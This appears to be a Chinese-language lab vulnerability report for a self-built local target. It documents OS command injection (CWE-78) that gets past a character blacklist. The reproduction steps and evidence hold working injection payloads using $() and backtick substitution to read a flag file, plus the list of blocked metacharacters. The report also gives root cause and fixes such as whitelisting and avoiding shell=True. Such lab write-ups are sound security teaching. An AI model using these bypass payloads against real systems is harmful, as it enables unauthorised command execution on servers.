# 漏洞报告 · 第三关（Kali 进阶）

## 一、基本信息

| 项 | 内容 |
|---|---|
| 标题 | Kali 本地靶机命令注入（绕过黑名单） |
| 靶机 | `http://127.0.0.1:8767`，Kali WSL2 内部，仅回环 |
| 漏洞类型 | 操作系统命令注入（CWE-78） |
| 难度 | 进阶：有防护，但防护不全 |
| 环境 | Kali Linux（内核 6.18.40.1-microsoft-standard-WSL2），Python 3.13.15 |
| 测试范围 | 本机自己写的靶机，未触碰任何外部目标 |
| 证据文件 | `evidence_cmd.txt` |
| 靶机源码 | `vuln_app3.py` |

## 二、这关难在哪

前两关是"门没关"：改个数字、改个引号直接进。

这关门是关了的——网站明确拦了 `;`、`&&`、`|`、`&`、换行。直白注入被挡回来。

但**它只挡了这几种写法，没挡 `$()` 和反引号**。换个写法，同一件事就做成了。

这就是真实世界最常见的样子：不是没防护，是防护漏了一块。

## 三、复现步骤（照着做就能重现）

1. 在 Kali 里启动靶机：`python3 vuln_app3.py`
2. 浏览器或 curl 打开 `http://127.0.0.1:8767/`，看到"系统健康检查"表单
3. 正常输入 `127.0.0.1` → 返回 `Checking host: 127.0.0.1`
4. 直白注入 `127.0.0.1; cat /tmp/kali_flag.txt` → 被拦，返回"检测到非法字符"
5. 换成 `127.0.0.1$(cat /tmp/kali_flag.txt)` → **返回了 flag**
6. 再换反引号 `` 127.0.0.1`cat /tmp/kali_flag.txt` `` → 同样拿到 flag

## 四、关键证据（原文照抄）

```
=== 2 直白注入：分号拼命令（预期被黑名单拦）===
{"error": "检测到非法字符，请求被拒绝"}

=== 3 绕过：用 $() 包住命令（黑名单没挡这个）===
{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1$(cat /tmp/kali_flag.txt)"}
```

复现 3 次全部相同；对照实验（读不存在的文件）返回空输出，说明确实是命令执行，不是页面写死的假数据。

## 五、危害（真实系统里）

拿到命令执行，等于攻击者能在服务器上以网站程序的身份干活：读配置文件、读数据库账号、改文件。

本靶机里只读了 `/tmp/kali_flag.txt` 这面旗，没碰系统文件、没提权、没横移。

## 六、根因（一句话）

把用户输入直接拼进系统命令交给 shell 执行，还用"黑名单挡几个词"当防护——挡不完的。

## 七、修复建议

1. **别用 shell**：能不用 `shell=True` 就不用，把参数分开传
2. **用白名单，不用黑名单**：只准输入 IP 格式（`数字.数字.数字.数字`），其余一律拒
3. 真要拼命令，对参数做严格转义，别信黑名单

## 八、查重说明

本洞是靶机故意写死的，不在任何漏洞库，无需查重。

真实目标才需要查：`cve.org`、`nvd.nist.gov`、`cnnvd.org.cn`、微软 MSRC 公告。
